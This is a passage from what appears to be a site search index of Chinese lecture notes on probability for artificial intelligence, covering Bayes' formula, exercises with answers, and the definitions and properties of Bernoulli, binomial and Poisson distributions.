0\\)\uff0c\u200b\u5219\u200b</p> \\[P(B_n|A) = \\frac{P(B_n)P(A|B_n)}{\\sum_{n=1}^{\\infty} P(B_n)P(A|B_n)}. \\tag{1.5.1}\\] <p>\u200b\u6ce8\u200b 1. \u200b\u5728\u200b\u4f7f\u7528\u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b\u65f6\u200b\uff0c\u200b\u5e38\u5c06\u200b \\(P(B_i)\\) \u200b\u53eb\u505a\u200b\u5148\u9a8c\u6982\u7387\u200b\uff0c\u200b\u800c\u200b\u5c06\u200b\u5728\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6761\u4ef6\u200b\u4e0b\u200b \\(B_i\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6982\u7387\u200b \\(P(B_i|A)\\) \u200b\u79f0\u4e3a\u200b\u540e\u9a8c\u200b\u6982\u7387\u200b\u3002\u200b\u56e0\u6b64\u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b (1.5.1) \u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u4ece\u200b\u5148\u9a8c\u6982\u7387\u200b\u5230\u200b\u540e\u9a8c\u200b\u6982\u7387\u200b\u7684\u200b\u8f6c\u6362\u200b\u516c\u5f0f\u200b\u3002</p> <p>\u200b\u6ce8\u200b 2. \u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e00\u4e2a\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u6211\u4eec\u200b\u5173\u5fc3\u200b\u7684\u200b\u662f\u200b \\(\\{B_n\\}_{n\\geq1}\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6982\u7387\u200b\u3002\u200b\u5728\u200b\u6700\u521d\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\"\u200b\u4fe1\u606f\u200b\"\uff0c\u200b\u56e0\u6b64\u200b\u662f\u200b\u5148\u9a8c\u6982\u7387\u200b \\(P(\\cdot)\\)\u3002\u200b\u4e4b\u540e\u200b\u6211\u4eec\u200b\u77e5\u9053\u200b\u4e86\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\"\u200b\u4fe1\u606f\u200b\"\uff0c\u200b\u5219\u200b\u6982\u7387\u200b\"\u200b\u4fee\u6b63\u200b\"\u200b\u4e3a\u200b\u540e\u9a8c\u200b\u6982\u7387\u200b \\(P(\\cdot|A)\\)\uff08\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u4e5f\u200b\u662f\u200b\u6982\u7387\u200b\uff09\u3002\u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5177\u4f53\u200b\u7684\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#_2","title":"\u4e60\u9898","text":"<p>\u200b\u4e60\u9898\u200b 1</p> <p>\u200b\u8bbe\u200b \\(A,B\\) \u200b\u662f\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b, \u200b\u8bc1\u660e\u200b:</p> \\[ |P(AB)-P(A)P(B)|\\leq\\frac{1}{4} \\] \u200b\u63d0\u793a\u200b <p>\u200b\u5229\u7528\u200b \\(E(1_A)=P(A)\\) \u200b\u548c\u200b\u534f\u65b9\u5dee\u200b\u4e0e\u200b\u65b9\u5dee\u200b\u7684\u200b\u5173\u7cfb\u200b. (\\(1_A\\) \u200b\u4e3a\u200b \\(A\\) \u200b\u7684\u200b\u793a\u6027\u200b\u51fd\u6570\u200b.)</p> \u200b\u7b54\u6848\u200b \\[ P(AB)-P(A)P(B)=E(1_A1_B)-E(1_A)E(1_B)=cov(1_A1_B) \\] \\[ var(1_A)=E({1_A}^2)-E(1_A)^2=E(1_A)-E(1_A)^2 \\leq \\frac{1}{4}  \\] <p>\u200b\u6839\u636e\u200b\u534f\u65b9\u5dee\u200b\u4e0e\u200b\u65b9\u5dee\u200b\u7684\u200b\u5173\u7cfb\u200b\u5373\u53ef\u200b\u5f97\u51fa\u7ed3\u8bba\u200b.</p> <p>\u200b\u4e60\u9898\u200b 2</p> <p>\\(n\\) \u200b\u4e2a\u70b9\u200b\u968f\u673a\u200b\u5206\u5e03\u200b\u5728\u200b\u5355\u4f4d\u200b\u5706\u4e0a\u200b, \u200b\u6c42\u200b \\(n\\) \u200b\u4e2a\u70b9\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u534a\u5706\u200b\u7684\u200b\u6982\u7387\u200b. (\u200b\u5f53\u200b \\(n=3\\) \u200b\u65f6\u200b, \u200b\u5373\u200b\u4e3a\u200b\u5b83\u4eec\u200b\u6784\u6210\u200b\u7684\u200b\u4e09\u89d2\u5f62\u200b\u4e0d\u662f\u200b\u9510\u89d2\u4e09\u89d2\u200b\u5f62\u200b\u7684\u200b\u6982\u7387\u200b.)</p> \u200b\u63d0\u793a\u200b <p>\\(n\\) \u200b\u4e2a\u70b9\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u534a\u5706\u200b, \u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u5b58\u5728\u200b\u76f8\u90bb\u200b\u4e24\u70b9\u200b\u7684\u200b\u5f27\u200b\u957f\u5927\u200b\u4e8e\u200b \\(\\pi\\). </p> \u200b\u7b54\u6848\u200b <p>\u200b\u8bb0\u200b \\(x_1,x_2,\\cdots,x_n\\) \u200b\u4ee3\u8868\u200b\u76f8\u90bb\u200b\u4e24\u70b9\u200b\u7684\u200b\u5f27\u957f\u200b, \u200b\u5219\u200b\u6837\u672c\u7a7a\u95f4\u200b\u4e3a\u200b:</p> \\[ x_1+x_2+\\cdots+x_n=2\\pi \\\\ \\] \\[ 0\\leq x_i \\leq 2\\pi \\  (1\\leq i \\leq n) \\] <p>\u200b\u53ef\u884c\u200b\u7a7a\u95f4\u200b\u4e3a\u200b:</p> \\[ x_1+x_2+\\cdots+x_n=2\\pi  \\] \\[ max(x_i)&gt;\\pi \\] <p>\u200b\u6ce8\u610f\u200b\u5230\u200b\u6700\u200b\u591a\u53ea\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b \\(x_i\\) \u200b\u5927\u4e8e\u200b \\(\\pi\\). \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u628a\u200b\u6bcf\u4e2a\u200b \\(x_i&gt;\\pi\\) \u200b\u7684\u200b\u60c5\u51b5\u200b\u76f8\u52a0\u200b\u8d77\u6765\u200b.</p> <p>\u200b\u5047\u8bbe\u200b \\(x_1&gt;\\pi\\), \u200b\u4ee4\u200b \\(y_1=x_1-\\pi\\), \u200b\u5219\u200b:</p> \\[ y_1+x_2+\\cdots+x_n=\\pi \\] \\[ 0\\leq y_1 \\leq \\pi, 0 \\leq x_i \\leq \\pi \\ (2\\leq i \\leq n) \\] <p>\u200b\u5229\u7528\u200b\u5355\u7eaf\u5f62\u200b\u7684\u200b\u4f53\u79ef\u200b\u516c\u5f0f\u200b\u5373\u53ef\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6982\u7387\u200b.</p> <p>\u200b\u7b54\u6848\u200b: \\(\\frac{n}{2^{n-1}}\\)</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/","title":"Chapter 02 \u200b\u968f\u673a\u53d8\u91cf\u200b\u4e0e\u200b\u6982\u7387\u5206\u5e03","text":""},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#_1","title":"\u672c\u7ae0\u200b\u4e3b\u8981\u200b\u5185\u5bb9","text":"<ul> <li>\u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b\uff1a\u200b\u4f2f\u52aa\u5229\u200b\u5206\u5e03\u200b\u3001\u200b\u4e8c\u9879\u5206\u5e03\u200b\u3001\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b\u3001\u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u3001\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u3001\u200b\u79bb\u6563\u200b\u5747\u5300\u5206\u5e03\u200b \uff08\u200b\u638c\u63e1\u200b\u6027\u8d28\u200b\u4e0e\u200b\u6982\u7387\u51fd\u6570\u200b\uff09</li> <li>\u200b\u8fde\u7eed\u200b\u968f\u673a\u53d8\u91cf\u200b\uff1a\u200b\u5747\u5300\u5206\u5e03\u200b\u3001\u200b\u6307\u6570\u5206\u5e03\u200b\u3001\u200b\u6b63\u6001\u5206\u5e03\u200b\u3001\u200b\u4f3d\u9a6c\u200b\u5206\u5e03\u200b\uff08\u200b\u638c\u63e1\u200b\u6027\u8d28\u200b\u4e0e\u200b\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u200b\uff0c\u200b\u4f3d\u9a6c\u200b\u4e86\u89e3\u200b\uff09 </li> <li>\u200b\u968f\u673a\u53d8\u91cf\u200b\u4e25\u683c\u200b\u5b9a\u4e49\u200b\uff08\u200b\u4e86\u89e3\u200b\uff09\u3001\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b\uff08\u200b\u638c\u63e1\u200b\uff09 </li> <li>\u200b\u968f\u673a\u53d8\u91cf\u200b\u7684\u200b\u51fd\u6570\u200b\uff08\u200b\u638c\u63e1\u200b\uff09 </li> <li>\u200b\u968f\u673a\u53d8\u91cf\u200b\u7684\u200b\u53cd\u51fd\u6570\u200b\uff08\u200b\u4e86\u89e3\u200b\uff09 </li> <li>\u200b\u671f\u671b\u200b\uff08\u200b\u638c\u63e1\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e86\u89e3\u200b\u4e25\u683c\u200b\u5b9a\u4e49\u200b\uff09 </li> <li>\u200b\u671f\u671b\u200b\u7684\u200b\u6027\u8d28\u200b\uff08\u200b\u638c\u63e1\u200b\uff09 </li> <li>\u200b\u968f\u673a\u53d8\u91cf\u200b\u51fd\u6570\u200b\u7684\u200b\u671f\u671b\u200b\uff08\u200b\u638c\u63e1\u200b\uff09 </li> <li>\u200b\u65b9\u5dee\u200b\uff08\u200b\u638c\u63e1\u200b\u8ba1\u7b97\u200b\uff09</li> <li>\u200b\u539f\u70b9\u200b\u77e9\u200b\u3001\u200b\u4e2d\u5fc3\u77e9\u200b\uff08\u200b\u638c\u63e1\u200b\u5b9a\u4e49\u200b\uff09\u3001\u200b\u5206\u200b\u4f4d\u6570\u200b\uff08\u200b\u4e86\u89e3\u200b\uff09</li> </ul>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#21","title":"2.1 \u200b\u968f\u673a\u53d8\u91cf","text":"<p>\u200b\u6211\u4eec\u200b\u5728\u200b\u6b64\u200b\u76f4\u63a5\u200b\u9610\u8ff0\u200b\u4e25\u683c\u200b\u7684\u200b\u968f\u673a\u53d8\u91cf\u200b\u5b9a\u4e49\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 2.1 \u200b\u968f\u673a\u53d8\u91cf\u200b</p> <p>\u200b\u8bbe\u200b \\((\\Omega, \\mathcal{F}, P)\\) \u200b\u662f\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b, \\(X:\\Omega \\to \\mathbb{R}\\) \u200b\u6ee1\u8db3\u200b\u5bf9\u200b\u4efb\u610f\u200b \\(x\\in \\mathbb{R}\\) \u200b\u90fd\u200b\u6709\u200b</p> \\[ \\{\\omega:X(\\omega)\\leq x\\} \\in \\mathcal{F} \\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b \u200b\u968f\u673a\u53d8\u91cf\u200b.</p> <p>\u200b\u6ce8\u200b </p> <p>\u200b\u4e00\u822c\u200b\u53ef\u4ee5\u200b\u628a\u200b \\(\\{\\omega:X(\\omega)\\leq x\\}\\) \u200b\u8bb0\u200b\u4f5c\u200b \\(\\{X\\leq x\\}\\).</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u968f\u673a\u53d8\u91cf\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u6837\u672c\u200b\u70b9\u5230\u200b\u5b9e\u6570\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6620\u5c04\u200b, \u200b\u8fd9\u4e2a\u200b\u6620\u5c04\u200b\u9700\u8981\u200b\u6ee1\u8db3\u200b \\(\\{X\\leq x\\}\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e8b\u4ef6\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#22","title":"2.2 \u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf","text":""},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#221","title":"2.2.1 \u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b\u7684\u200b\u5b9a\u4e49","text":"<p>\u200b\u5b9a\u4e49\u200b 2.2 \u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u53ea\u53d6\u200b\u6709\u9650\u200b\u4e2a\u200b\u6216\u200b\u53ef\u5217\u4e2a\u200b\u503c\u200b \\(x_1, \\cdots, x_n\\), \u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u662f\u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b.</p> <p>\u200b\u8868\u200b 2.1: \u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5206\u5e03\u200b</p> \\(X\\) \\(x_1\\) \\(x_2\\) \\(\\cdots\\) \\(x_k\\) \\(\\cdots\\) \\(p\\) \\(p_1\\) \\(p_2\\) \\(\\cdots\\) \\(p_k\\) \\(\\cdots\\) <p>\u200b\u8868\u200b 2.1 \u200b\u4e5f\u200b\u79f0\u4e3a\u200b \\(X\\) \u200b\u7684\u200b \u200b\u6982\u7387\u5206\u5e03\u200b\u8868\u200b\u3002</p> <p>\u200b\u5b9a\u4e49\u200b 2.3 \u200b\u6982\u7387\u5206\u5e03\u200b\u5217\u200b</p> <p>\u200b\u8bbe\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u53d6\u503c\u200b\u4e3a\u200b \\(x_1, x_2, \\cdots\\) (\u200b\u6709\u9650\u200b\u4e2a\u200b\u6216\u200b\u53ef\u5217\u200b\u65e0\u7a77\u200b\u591a\u4e2a\u200b), \u200b\u5219\u200b\u79f0\u200b</p> \\[p_k = P(X = x_k), \\quad k = 1, 2, ...\\] <p>\u200b\u4e3a\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5206\u5e03\u200b,\u200b\u4e5f\u200b\u79f0\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u51fd\u6570\u200b\u6216\u200b\u6982\u7387\u5206\u5e03\u200b\u5f8b\u200b\u3002</p> <p>\u200b\u6982\u7387\u5206\u5e03\u200b\u5217\u200b \\({p_k}\\) \u200b\u5177\u6709\u200b\u5982\u4e0b\u200b\u6027\u8d28\u200b: (1) \\(p_k \\geq 0 \\quad (k = 1,2,\\cdots);\\) (2) \\(\\sum_k p_k=1\\).</p> <p>\u200b\u4e0b\u9762\u200b\u4ecb\u7ecd\u200b\u51e0\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b:</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#222","title":"2.2.2 \u200b\u4e24\u70b9\u200b\u5206\u5e03\u200b (\u200b\u4f2f\u52aa\u5229\u200b\u5206\u5e03\u200b)","text":"<p>\u200b\u5b9a\u4e49\u200b 2.3 \u200b\u4e24\u70b9\u200b\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u53ea\u53d6\u200b \\(0\\) \u200b\u548c\u200b \\(1\\) \u200b\u4e24\u4e2a\u200b\u503c\u200b, \u200b\u4e14\u200b\u5176\u200b\u6982\u7387\u5206\u5e03\u200b\u4e3a\u200b:</p> \\[P(X = 1) = p, \\quad P(X = 0) = 1 - p,\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u4e24\u70b9\u200b\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \\sim B(1, p)\\), \u200b\u5176\u4e2d\u200b \\(0 \\leq p \\leq 1\\).</p> <p>\u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b \\(A\\), \u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u968f\u673a\u53d8\u91cf\u200b \\(1_A\\) (\u200b\u4e5f\u200b\u79f0\u4e3a\u200b\u793a\u6027\u200b\u51fd\u6570\u200b) :</p> \\[1_A(\u03c9) = \\begin{cases} 1, &amp; \u03c9 \u2208 A;\\\\ 0, &amp; \u03c9 \u2209 A. \\end{cases}\\] <p>\u200b\u5219\u200b \\(1_A\\) \u200b\u670d\u4ece\u200b\u4e24\u70b9\u200b\u5206\u5e03\u200b\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#223","title":"2.2.3 \u200b\u4e8c\u9879\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.4 \u200b\u4e8c\u9879\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u53d6\u503c\u200b\u4e3a\u200b \\(0, 1, \\cdots, n\\), \u200b\u4e14\u200b</p> \\[P(X = k) = C_n^k p^k (1-p)^{n-k}, \\quad k = 0, 1, ..., n.\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(n, p\\) \u200b\u7684\u200b\u4e8c\u9879\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c B(n, p)\\) (\u200b\u5176\u4e2d\u200b \\(n \\geq 1, 0 \\leq p \\leq 1\\)).</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u4e8c\u9879\u5206\u5e03\u200b\u6b63\u662f\u200b\u72ec\u7acb\u200b\u91cd\u590d\u200b \\(n\\) \u200b\u6b21\u200b\u4f2f\u52aa\u5229\u200b\u5206\u5e03\u200b\u5b9e\u9a8c\u200b\u7684\u200b\u7ed3\u679c\u200b.</p> <p>\u200b\u4e00\u4e2a\u200b\u81ea\u7136\u200b\u7684\u200b\u95ee\u9898\u200b\u662f\u200b, \u200b\u4e8c\u9879\u5206\u5e03\u200b\u7684\u200b\u5f62\u72b6\u200b\u662f\u200b\u600e\u6837\u200b\u7684\u200b? \u200b\u4ece\u200b\u4e0b\u9762\u200b\u7684\u200b\u5b9a\u7406\u200b\u53ca\u5176\u200b\u8bc1\u660e\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u4e8c\u9879\u5206\u5e03\u200b \u200b\u662f\u200b\u5355\u5cf0\u200b\u7684\u200b,\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u6c42\u200b\u51fa\u200b\u6700\u5927\u200b\u6982\u7387\u200b\u7684\u200b\u53d6\u503c\u200b.</p> <p>\u200b\u5b9a\u7406\u200b 2.1 \u200b\u4e8c\u9879\u5206\u5e03\u200b\u7684\u200b\u6700\u5927\u503c\u200b\u70b9\u200b</p> <p>\u200b\u8bbe\u200b \\(X \\sim B(n, p)\\), \u200b\u5c06\u200b \\(P(X = k)\\) \u200b\u770b\u4f5c\u200b \\(k\\) \u200b\u7684\u200b\u51fd\u6570\u200b, \u200b\u5219\u200b\u5176\u200b\u6700\u5927\u503c\u200b\u70b9\u200b \\(k_0\\) \u200b\u4e3a\u200b:</p> <p>(1) \u200b\u82e5\u200b \\((n+1)p \\not\\in \\mathbb{Z}\\), \u200b\u5219\u200b \\(k_0\\) = \\([(n+1)p]\\);</p> <p>(2) \u200b\u82e5\u200b \\((n+1)p \\in \\mathbb{Z}\\), \u200b\u5219\u200b \\(k_0 = (n+1)p\\) \u200b\u6216\u200b \\((n+1)p-1\\).</p> <p>\u200b\u8bc1\u660e\u200b: </p> <p>\u200b\u8bb0\u200b \\(p_n(k) = P(X = k)\\), \u200b\u5219\u200b</p> \\[\\frac{p_n(k+1)}{p_n(k)} = \\frac{n-k}{k+1} \\cdot \\frac{p}{1-p}\\] <p>\u200b\u5206\u6790\u200b\u6bd4\u503c\u200b\u4e0e\u200b \\(1\\) \u200b\u7684\u200b\u5927\u5c0f\u200b\u5173\u7cfb\u200b\u5373\u53ef\u200b. </p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#224","title":"2.2.4 \u200b\u6cca\u677e\u200b\u5206\u5e03","text":"<p>\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b\u7531\u6cca\u677e\u200b \\((\\text{S. Poisson(1781-1840)})\\) \u200b\u5728\u200b \\(1837\\) \u200b\u5e74\u200b\u9996\u6b21\u200b\u63d0\u51fa\u200b, \u200b\u662f\u200b\u4e8c\u9879\u5206\u5e03\u200b \\(B(n, p_n)\\) \u200b\u5728\u200b \\(n\\) \u200b\u5f88\u5927\u200b\u800c\u200b \\(np_n \\to \\lambda\\) \u200b\u65f6\u200b\u7684\u200b\u6781\u9650\u200b\u5206\u5e03\u200b\u3002</p> <p>\u200b\u5b9a\u4e49\u200b 2.5 \u200b\u6cca\u677e\u200b\u5206\u5e03\u200b</p> <p>\u200b\u8bbe\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u53d6\u503c\u200b\u662f\u200b\u5168\u4f53\u200b\u975e\u8d1f\u200b\u6574\u6570\u200b, \u200b\u4e14\u200b</p> \\[P(X = k) = \\frac{\u03bb^k}{k!}e^{-\u03bb}, \\quad k = 0, 1, 2,\\cdots.\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\u03bb\\) \u200b\u7684\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b,\u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c \\mathcal{P}(\u03bb)\\),\u200b\u5176\u4e2d\u200b \\(\u03bb &gt; 0\\).</p> <p>\u200b\u5982\u4f55\u200b\u7406\u89e3\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b\u662f\u200b\u4e8c\u9879\u5206\u5e03\u200b\u4e2d\u200b \\(n\\) \u200b\u5f88\u5927\u200b\u800c\u200b \\(np_n\\to\\lambda\\) \u200b\u7684\u200b\u6781\u9650\u200b?</p> <p>\u200b\u5df2\u77e5\u200b \\(\\lim\\limits_{n\\to +\\infty}np_n=\\lambda\\), \u200b\u5bb9\u6613\u200b\u77e5\u9053\u200b \\(\\lim\\limits_{n\\to+\\infty}p_n=0\\).</p> <p>\u200b\u89c2\u5bdf\u200b\u4e8c\u9879\u5206\u5e03\u200b\u7684\u200b\u5206\u5e03\u200b\u5217\u200b \\(P(X=k)=C_{n}^{k}p_n^k(1-p_n)^{n-k}\\)</p> \\[ \\begin{align} C_{n}^{k}p_n^k(1-p_n)^{n-k} &amp;= \\frac{n(n-1)\\cdots(n-k+1)}{k!} p_n^k (1-p_n)^{n-k} \\\\ &amp;= \\frac{1}{k!}(np_n)^k \\left(1-\\frac{1}{n}\\right)\\left(1-\\frac{2}{n}\\right)\\cdots\\left(1-\\frac{k-1}{n}\\right)(1-p_n)^{n-k} \\\\ \\end{align} \\] <p>\u200b\u6ce8\u610f\u200b\u5230\u200b</p> <p>$$ \\begin{align} (1-p_n)^{n-k} &amp;= \\exp{(n-k)\\ln(1-p_n)}\\ &amp;= \\exp\\left{(n-k)p_n \\cdot \\frac{1}{p_n}\\ln(1-p_n)\\right} \\end{align} $$ \u200b\u5f53\u200b \\(n \\to \\infty\\) \u200b\u65f6\u200b:</p> \\[\\lim_{n\\to\\infty} p_n = 0, \\quad \\lim_{n\\to\\infty} np_n = \u03bb, \\quad \\lim_{n\\to\\infty} \\frac{1}{p_n}\\ln(1-p_n) = -1\\] <p>\u200b\u6545\u200b </p> \\[\\lim\\limits_{n\\to +\\infty}C_{n}^{k}p_n^k(1-p_n)^{n-k}=\\frac{\\lambda^k}{k!}\\text{e}^{-\\lambda}\\] <p>\u200b\u8fd9\u4e2a\u200b\u516c\u5f0f\u200b\u4e5f\u200b\u79f0\u4e3a\u200b\u7b2c\u4e00\u200b\u8fd1\u4f3c\u200b\u516c\u5f0f\u200b, \u200b\u5728\u200b\u4e8c\u9879\u5206\u5e03\u200b\u4e2d\u200b \\(n\\) \u200b\u5f88\u5927\u200b\u6982\u7387\u200b\u4e0d\u597d\u200b\u8ba1\u7b97\u200b\u65f6\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u8fd1\u4f3c\u200b\u516c\u5f0f\u200b\u8ba1\u7b97\u200b.</p> <p>\u200b\u5b9a\u7406\u200b 2.2</p> <p>\u200b\u8bbe\u200b \\(X \u223c P(\u03bb)\\), \u200b\u8bb0\u200b \\(p_k = P(X = k)\\), \u200b\u5219\u200b</p> <p>(1) \u200b\u82e5\u200b \u03bb \u200b\u4e0d\u662f\u200b\u6b63\u6574\u6570\u200b,\u200b\u5219\u200b</p> \\[p_0 &lt; p_1 &lt; \u22ef &lt; p_{[\u03bb]} &gt; p_{[\u03bb]+1} &gt; \u22ef;\\] <p>(2) \u200b\u82e5\u200b \u03bb \u200b\u662f\u200b\u6b63\u6574\u6570\u200b,\u200b\u5219\u200b</p> \\[p_0 &lt; p_1 &lt; \u22ef &lt; p_{\u03bb-1} &lt; p_\u03bb &gt; p_{\u03bb+1} &gt; \u22ef.\\] <p>\u200b\u8bc1\u660e\u200b: \u200b\u7531\u200b \\(p_{k+1} = \\frac{\u03bb}{k+1}p_k\\), \u200b\u7c7b\u4f3c\u200b\u5b9a\u7406\u200b 2.1 \u200b\u7684\u200b\u8bc1\u660e\u200b\u53ef\u200b\u5f97\u200b\u3002</p> <p>\u200b\u4f8b\u9898\u200b 2.1</p> <p>\u200b\u5df2\u77e5\u200b\u67d0\u200b\u5546\u573a\u200b\u4e00\u5929\u200b\u6765\u200b\u7684\u200b\u987e\u5ba2\u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\u03bb\\) \u200b\u7684\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b, \u200b\u800c\u200b\u6bcf\u4e2a\u200b\u6765\u200b\u5546\u573a\u200b\u7684\u200b\u987e\u5ba2\u200b\u8d2d\u7269\u200b\u6982\u7387\u200b\u4e3a\u200b \\(p\\), \u200b\u8bc1\u660e\u200b\u6b64\u200b\u5546\u573a\u200b\u4e00\u5929\u200b\u5185\u200b\u8d2d\u7269\u200b\u7684\u200b\u987e\u5ba2\u200b\u6570\u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\u03bbp\\) \u200b\u7684\u200b\u6cca\u677e\u200b\u5206\u5e03\u200b.</p> <p>\u200b\u8bc1\u660e\u200b: \u200b\u8bbe\u200b \\(Y\\) \u200b\u8868\u793a\u200b\u5546\u573a\u200b\u4e00\u5929\u200b\u5185\u200b\u8d2d\u7269\u200b\u7684\u200b\u987e\u5ba2\u200b\u6570\u200b, \u200b\u5219\u200b\u7531\u200b\u5168\u200b\u6982\u7387\u200b\u516c\u5f0f\u200b, \u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b\u975e\u8d1f\u200b\u6574\u6570\u200b \\(k\\) \u200b\u6709\u200b $\\(P(Y = k) = \\sum_{i=k}^\u221e P(X = i)P(Y = 